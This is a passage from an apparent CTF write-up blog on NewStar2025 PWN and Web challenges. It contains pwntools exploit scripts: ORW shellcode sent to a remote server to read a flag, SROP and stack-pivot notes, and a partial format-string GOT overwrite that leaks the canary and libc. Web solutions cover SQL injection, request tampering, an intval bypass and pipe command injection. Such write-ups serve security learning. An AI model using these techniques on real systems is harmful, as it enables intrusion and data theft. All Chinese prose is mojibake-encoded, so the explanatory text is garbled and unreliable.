class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x3c                // __NR_exit = 60</span><br><span class="line">xor rdi, rdi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>åˆåœ¨ä¸€èµ·çš„python å°±æ˜¯:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># nc 39.106.57.152 39122</span></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;39.106.57.152&#x27;</span>,<span class="number">39122</span>)   </span><br><span class="line"></span><br><span class="line">BUF_ADDR = <span class="number">0x114514</span>      <span class="comment"># mmap åœ°å€</span></span><br><span class="line">IOVEC_ADDR = BUF_ADDR + <span class="number">0x100</span> <span class="comment"># iovec çµæ§‹åœ°å€</span></span><br><span class="line">BUFFER_ADDR = BUF_ADDR + <span class="number">0x200</span> <span class="comment"># æ–‡ä»¶å…§å®¹ç·©è¡å€åœ°å€</span></span><br><span class="line">FLAG_STR_ADDR = BUF_ADDR + <span class="number">0x300</span> <span class="comment"># &quot;flag&quot; å­—ä¸²åœ°å€ (è¨»ï¼šæ ¹æ“šä½ çš„ ls çµæœï¼Œæ–‡ä»¶æ˜¯ &#x27;flag&#x27; è€Œé &#x27;flag.txt&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ­£çµ„è­¯éŒ¯èª¤ï¼Œç§»é™¤è¡Œå°¾è¨»é‡‹å’Œä¸å¿…è¦çš„ç©ºæ ¼</span></span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* ------------------- 1. è¨­ç½® iovec çµæ§‹ ------------------- */</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;BUFFER_ADDR&#125;</span></span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;IOVEC_ADDR&#125;</span>], rax</span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;IOVEC_ADDR&#125;</span> + 8], 0x100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 2. openat(&quot;flag&quot;) ------------------- */</span></span><br><span class="line"><span class="string">    /* å°‡ &quot;flag&quot; å­—ä¸²å¯«å…¥å†…å­˜ (4 bytes, æ•…åªéœ€ mov dword) */</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;FLAG_STR_ADDR&#125;</span></span></span><br><span class="line"><span class="string">    mov rsi, 0x67616c66        # &quot;flag&quot;</span></span><br><span class="line"><span class="string">    mov dword ptr [rdi], esi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* openat(AT_FDCWD, &quot;flag&quot;, O_RDONLY, 0) */</span></span><br><span class="line"><span class="string">    mov rax, 0x101             # __NR_openat = 257</span></span><br><span class="line"><span class="string">    mov rdi, 0xFFFFFF9C        # AT_FDCWD (-100)</span></span><br><span class="line"><span class="string">    mov rsi, <span class="subst">&#123;FLAG_STR_ADDR&#125;</span>   # &quot;flag&quot;</span></span><br><span class="line"><span class="string">    xor rdx, rdx               # O_RDONLY</span></span><br><span class="line"><span class="string">    syscall                    # RAX = fd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 3. readv(fd, &amp;iov, 1) ------------------- */</span></span><br><span class="line"><span class="string">    mov rdi, rax               # RDI = fd</span></span><br><span class="line"><span class="string">    mov rax, 0x13              # __NR_readv = 19</span></span><br><span class="line"><span class="string">    mov rsi, <span class="subst">&#123;IOVEC_ADDR&#125;</span>      # RSI = &amp;iovec</span></span><br><span class="line"><span class="string">    mov rdx, 0x1               # RDX = 1 (iovec count)</span></span><br><span class="line"><span class="string">    syscall                    # è®€å–å…§å®¹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 4. writev(STDOUT, &amp;iov, 1) ------------------- */</span></span><br><span class="line"><span class="string">    mov rax, 0x14              # __NR_writev = 20</span></span><br><span class="line"><span class="string">    mov rdi, 0x1               # RDI = STDOUT_FILENO (1)</span></span><br><span class="line"><span class="string">    mov rsi, <span class="subst">&#123;IOVEC_ADDR&#125;</span>      # RSI = &amp;iovec</span></span><br><span class="line"><span class="string">    mov rdx, 0x1               # RDX = 1 (iovec count)</span></span><br><span class="line"><span class="string">    syscall                    # è¼¸å‡ºå…§å®¹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ------------------- 5. exit(0) ------------------- */</span></span><br><span class="line"><span class="string">    mov rax, 0x3c              # __NR_exit = 60</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="only-read-å‘³å¤åˆ»"><a href="#only-read-å‘³å¤åˆ»" class="headerlink" title="only_read(å‘³å¤åˆ»)"></a>only_read(å‘³å¤åˆ»)</h2><img src="93992dc96bf7e31ed0d80e8bcc0a6576.png" alt="screen-capture.png"  /><img src="eee302b8a320dcfd5759c51f3a7f756f.png" alt="screen-capture.png"  /><img src="bb101dcfdd2acbb5e4aed9f79d281c65.png" alt="screen-capture.png"  /><p>banäº† execve</p><h3 id="é€™ä¸€é¡Œæ˜¯SROP-æ ˆè¿ç§»-ORW"><a href="#é€™ä¸€é¡Œæ˜¯SROP-æ ˆè¿ç§»-ORW" class="headerlink" title="é€™ä¸€é¡Œæ˜¯SROP + æ ˆè¿ç§» + ORW"></a>é€™ä¸€é¡Œæ˜¯SROP + æ ˆè¿ç§» + ORW</h3><p>srop æ˜¯ sigreturn rop çš„ç°¡ç¨±<br>åƒè€ƒå½±ç‰‡:<br><a href="https://www.bilibili.com/video/BV1ob32zuExQ/?spm_id_from=333.337.search-card.all.click&vd_source=b128d59725d91ecef706ce0b01795a8f">https://www.bilibili.com/video/BV1ob32zuExQ/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;b128d59725d91ecef706ce0b01795a8f</a></p><p>æœ‰ä¸€å€‹gift:</p><p>return 15 æ˜¯ä¸€å€‹sigreturnçš„ç³»çµ±èª¿ç”¨<br>signal frame No.1 â€“&gt; bss å¯«å…¥â€&#x2F;flag\x00â€  (6ä½)<br>signal frame No.2 â€“&gt; SYS_open<br>signal frame No.3 â€“&gt; SYS_read<br>signal frame No.4 â€“&gt; SYS_write<br>å…ˆçœ‹çœ‹bssæ®µ:<br><img src="000fa080e02c4b7aaa6cabe2930d9e93.png" alt="screen-capture.png"  /></p><p> 0x404000   -   0x405000 rwp<br>bss &#x3D; 0x404000</p><img src="a35ba9d44b8d5da00d140547e72392a4.png" alt="screen-capture.png"  /><p> syscall &#x3D; 0x40136d (gift)</p><h3 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h3><p>å³ä½¿æ”»å‡»è€…å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ï¼Œæ ˆä¸Šçš„ç©ºé—´ï¼ˆ16å­—èŠ‚ï¼‰ä¹Ÿå¤ªå°äº†ï¼Œæ— æ³•æ”¾ä¸‹å¤æ‚çš„æ”»å‡»è½½è·ï¼ˆpayloadï¼‰ã€‚<br>è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ª leave; ret â€œgadgetâ€ï¼ˆå°å·¥å…·ä»£ç æ®µï¼‰æ¥å®ç°ã€‚<br>leave æŒ‡ä»¤ç­‰åŒäº mov rsp, rbp; pop rbp</p><h2 id="ORW-1"><a href="#ORW-1" class="headerlink" title="ORW"></a>ORW</h2><p>å¯ä»¥åƒè€ƒweek2çš„noshell</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>ã€Œæ ˆé·ç§»ã€ï¼‹ã€Œå¸ƒç½® sigframeã€<br>vuln buffer åªæœ‰ 0x10 bytes å¤ªå°ï¼Œæ”¾ä¸ä¸‹ sigframeï¼ˆsigframe çµæ§‹å¾ˆå¤§ï¼‰ã€‚<br>æ‰€ä»¥æˆ‘å€‘åˆ©ç”¨ leave; ret gadget ä¾†æŠŠ stack æŒ‡é‡ rsp ç§»åˆ°ä¸€å€‹å¤§çš„å¯æ§å€åŸŸ<br>æ‰¾leave; ret gadget :</p><p>leave_ret &#x3D; 0x4012b0<br>payload    &#x3D; bâ€™Aâ€™ * 0x10<br>payload +&#x3D; p64(bss)<br>payload +&#x3D; p64(leave_ret)</p><h3 id="No-1-No-2-No-3-No-4"><a href="#No-1-No-2-No-3-No-4" class="headerlink" title="No.1 No.2 No.3 No.4"></a>No.1 No.2 No.3 No.4</h3><p>å·²çŸ¥<br>syscall gadget &#x3D; 0x40136dï¼ˆgiftï¼‰bss &#x3D; 0x404000<br>SYS_read :</p><p>SYS_open:</p><p>SYS_read:</p><p>SYS_ write</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="fmt-and-got-å‘³å¤åˆ»"><a href="#fmt-and-got-å‘³å¤åˆ»" class="headerlink" title="fmt and got(å‘³å¤åˆ»)"></a>fmt and got(å‘³å¤åˆ»)</h2><img src="1427336ac17890391f025d9d964497fa.png" alt="screen-capture.png"  /><p>ç¬¬ä¸€æ¬¡: plt-&gt;got-&gt;plt-&gt;æ›´æ”¹å‡½æ•°æ”¹got-&gt;é‡æ–°æ‰§è¡Œ-&gt;å»å¾€çœŸå®å‡½æ•°</p><p>ç¬¬äºŒæ¬¡plt-&gt;got-&gt;çœŸå®å‡½æ•°</p><p>å­˜æ”¾å‡½æ•°åœ°å€çš„æ•°æ®è¡¨ï¼Œç§°ä¸ºå…¨å±€åç§»è¡¨ï¼ˆGOT, Global Offset Tableï¼‰ï¼Œè€Œé‚£ä¸ªé¢å¤–ä»£ç æ®µè¡¨ï¼Œç§°ä¸ºç¨‹åºé“¾æ¥è¡¨ï¼ˆPLTï¼ŒProcedure Link Tableï¼‰</p><h3 id="Ubuntu-GLIBC-2-35-0ubuntu3-10-1"><a href="#Ubuntu-GLIBC-2-35-0ubuntu3-10-1" class="headerlink" title="Ubuntu GLIBC 2.35-0ubuntu3.10"></a>Ubuntu GLIBC 2.35-0ubuntu3.10</h3><p>ç”¨patchelfæ›´æ› libc å’Œ ld æ–‡ä»¶<br><img src="abf3c83028a19983967c4a2d5f9b1aac.png" alt="screen-capture.png"  /></p><img src="f6e94609176cf6e793e551bf7d048913.png" alt="fffffdd7-24d9-4ee8-ac48-42a010c30d2e.png"  /><p>(0xd4a8-0xd3a0)&#x2F;8 &#x3D; 33 , 33+6 &#x3D; 39</p><p>%39$p</p><img src="ccd3025f4ef2fff9d28bb2ec01b6a249.png" alt="635eb358-2363-4edf-8335-00edb7adb334.png"  /><p>%61$p</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa%39$p.%61$p</span><br></pre></td></tr></table></figure><img src="55d86fef80c753c5ffe8955b574da78a.png" alt="screen-capture.png"  /><p>0x7ffff7c29e40 - 0x7ffff7c00000 &#x3D; 0x29E40</p><p>libc_base &#x3D; libc - 0x29E40</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./fmt_got&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&#x27;./fmt_got&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;aaaa%39$p.%61$p&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;00&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">libc_a = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode(),<span class="number">16</span>)</span><br><span class="line">libc_base = libc_a - <span class="number">0x29E40</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_a))</span><br><span class="line"></span><br><span class="line">read_flag_addr = elf.symbols[<span class="string">&#x27;read_flag&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_flag_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>format-string æ”¹å¯« GOT â†’ è®“ç¨‹å¼å‘¼å« read_flag</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar2025 Web (1æœˆå°¾æœƒå†æ›´æ–°)</title>
      <link href="/ghsc_ovo_0721/NewStar2025-Web-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/"/>
      <url>/ghsc_ovo_0721/NewStar2025-Web-1%E6%9C%88%E5%B0%BE%E6%9C%83%E5%86%8D%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>ä½œè€…ï¼šghsc</p><p>å‰è¨€:å°å¼Ÿå› æ¯”å®Œè³½å°±ä¸€ç›´è£œèª²å’Œè£œä½œæ¥­ï¼Œè£œå®Œå°±æœŸæœ«è€ƒï¼Œæ‰€ä»¥è¦å¯’å‡æ‰å¯ä»¥å¤åˆ»ã€‚</p><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="1-multi-headach3"><a href="#1-multi-headach3" class="headerlink" title="1.multi-headach3"></a>1.multi-headach3</h2><p>ä»€ä¹ˆå«æœºå™¨äººæ§åˆ¶äº†æˆ‘çš„å¤´ï¼Ÿ ä¸€çœ‹å°±çŸ¥é“æ˜¯robots.txt </p><img src="f55218c8ea70797e87de415ca66c44d1.png" alt="screen-capture.png"  /><img src="5bfcc56c224ba8bc2928d01a9dc1d568.png" alt="screen-capture.png"  /><h2 id="2-strange-login"><a href="#2-strange-login" class="headerlink" title="2.strange_login"></a>2.strange_login</h2><p>ç°¡å–®sqlæ³¨å…¥:</p><img src="91f76867ac291990e6fe82bd77247d52.png" alt="screen-capture.png"  /><img src="bdd51a9553780dfbd0119b550a97bdb2.png" alt="screen-capture.png"  /><h2 id="3-é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰"><a href="#3-é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰" class="headerlink" title="3.é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰"></a>3.é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰</h2><p>HTTP åè®®: é€™é¡Œæœ€å¾Œè¶…é›£ã€‚</p><p>ç¬¬ä¸€é—œ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŠ“åŒ…:çœ‹è¦‹äº†POST å‚³åƒ &#123;&quot;count&quot;:1&#125; , ä¿®æ”¹ä¸€ä¸‹ æ”¹æˆ&#123;&quot;count&quot;:1000&#125; </span><br></pre></td></tr></table></figure><img src="f4af20b7bbd1a72146466219a4fb3db2.png" alt="screen-capture.png"  /><img src="acb7675162910c0062017af90e5e27b1.png" alt="screen-capture.png"  /><br/><p>ç¬¬äºŒé—œ: GET ?shipin&#x3D;mogubaozi POST a&#x3D;guding , æ”¹DELETE åŠ ä¸Š b &#x3D; chongzi</p><img src="747aea9ea2dc6eaef2191d17075502de.png" alt="screen-capture.png"  /><p>ç¬¬ä¸‰é—œ: </p><img src="bfed548a5249d3a23ca5098d5e127410.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;1.0 </p><img src="5a73ca97658ea4f187c38ef6fe00ccdc.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;2.0</p><img src="5d40391d53c255be87ce1b71590fa358.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;2.0 , DashSlash&#x2F;1.0</p><img src="362577da7b187536561a58fea98b9bde.png" alt="screen-capture.png"  /><p>User-Agent: CycloneSlash&#x2F;2.0 , DashSlash&#x2F;5.0</p><img src="413a67f617263aae3b6178e4272705b7.png" alt="screen-capture.png"  /><h2 id="4-å®‡å®™çš„ä¸­å¿ƒæ˜¯php"><a href="#4-å®‡å®™çš„ä¸­å¿ƒæ˜¯php" class="headerlink" title="4.å®‡å®™çš„ä¸­å¿ƒæ˜¯php"></a>4.å®‡å®™çš„ä¸­å¿ƒæ˜¯php</h2><img src="d633cbd7234c32336c9fd70f6d4f6423.png" alt="screen-capture.png"  /><img src="7fa0548af154aff4b4b75db1a2305e1d.png" alt="screen-capture.png"  /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;newstar2025&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$answer</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;newstar2025&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$answer</span>)!=<span class="number">47</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$answer</span>,<span class="number">0</span>)==<span class="number">47</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä½ è¿˜æœªå‚é€å¥¥ç§˜&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POST newstar2025 intval( !&#x3D;47) ä½†æ˜¯( &#x3D;47)</p><img src="afaa0778f99d6b473f13529e1703bfcc.png" alt="screen-capture.png"  /><p>å…«è¿›åˆ¶æ•° 057 &#x3D; 5*8 + 7 &#x3D; 47 </p><h2 id="5-æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†"><a href="#5-æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†" class="headerlink" title="5.æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†"></a>5.æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†</h2><img src="221325a0ba22dc71088bf42e7d90b766.png" alt="screen-capture.png"  /><p>åˆ·æ–°å’ŒF12,æ‹¼æ‰‹é€Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#shieldOverlay&#x27;</span>).<span class="title function_">remove</span>();</span><br></pre></td></tr></table></figure> <img src="7c9d833c6b7a20134829a5ec452d2e28.png" alt="screen-capture.png"  /><img src="8e5e3b3610bd6ab237d0a2084de93a2f.png" alt="screen-capture.png"  /><p>ç”¨BPçˆ†ç ´ :</p><ul><li>admin </li><li>111111</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">è½»è½»æ¾æ¾ç»•</span><br><span class="line">çœŸçš„å¾ˆè½»æ¾</span><br><span class="line"></span><br><span class="line">æºç </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_dynamic_flag</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;ICQ_FLAG&quot;</span>) ?: <span class="string">&#x27;default_flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;newstar&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æ­å–œæŒæ¡æ–°å§¿åŠ¿&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\d*\/~()\s]/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è€å¥—è·¯äº†ï¼Œè¡Œä¸è¡Œå•Š&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[\d\s]+$/&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¯·è¾“å…¥æœ‰æ•ˆçš„è¡¨è¾¾å¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$test</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="string">&quot;\$test = <span class="subst">$input</span>;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¡¨è¾¾å¼é”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$test</span> == <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">generate_dynamic_flag</span>(<span class="variable">$flag_secret</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;success&#x27;&gt;æ‹¿ä¸‹flagï¼&lt;/div&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: <span class="subst">&#123;$flag&#125;</span>&lt;/div&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;error&#x27;&gt;å¤§å“¥å“¥æ³¥æŠŠæ•°å­—ç®—é”™äº†: <span class="subst">$test</span> â‰  2025&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="04aaac0bff70285ef6a0cb3ea570b301.png" alt="screen-capture.png"  /><h2 id="6-åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³"><a href="#6-åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³" class="headerlink" title="6.åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³"></a>6.åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³</h2><img src="05aefd0a89d4afa25e92be1579101066.png" alt="æˆªå›¾" style="zoom:50%;" /><img src="ad97ec4053986e5a1ddb15407236178b.png" alt="screen-capture.png"  /><p>ç¬¬äºŒé—œè¦1000000åˆ†???????? , çœ‹çœ‹å®Œæˆç¬¬ä¸€é—œæœƒæ€æ¨£</p><p>æŠ“åŒ…æ²’æœ‰ç™¼ä»€éº¼ , æ‡‰è©²æ˜¯JS codeäº†</p><img src="13aea23ba1945003b598f4c5d260996a.png" alt="screen-capture.png"  /><p>è©¦ä¸€è©¦ score &#x3D; 1000000 ;</p><img src="a23455cd4a3ffc55ae4c28b8786db597.png" alt="screen-capture.png"  /><img src="8a1775109be806114dd6ee3160a6d8df.png" alt="screen-capture.png"  /><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="1-DDåŠ é€Ÿå™¨"><a href="#1-DDåŠ é€Ÿå™¨" class="headerlink" title="1.DDåŠ é€Ÿå™¨"></a>1.DDåŠ é€Ÿå™¨</h2><p>å¯ä»¥ç”¨ç®¡é“ç¬¦</p><img src="835b7a2b55e92bf312263c6c01f9a06f.png" alt="screen-capture.png"  /><img src="303981da871e616cc2eff5cd657d75c9.png" alt="screen-capture.png"  /><p>çœ‹çœ‹env , æƒ³ä¸åˆ°å‡ºç¾äº†flag</p><img src="188a101c4d4b8ec88ac5e733777dc2b9.png" alt="screen-capture.png"  /><p>flag{c45bacbe-370b-44cf-aeb7-37a3c7f07873}</p><h2 id="2-æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜"><a href="#2-æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜" class="headerlink" title="2.æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜"></a>2.æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜</h2><ul><li>è€ƒé©— JavaScript codeèƒ½åŠ›</li></ul><img 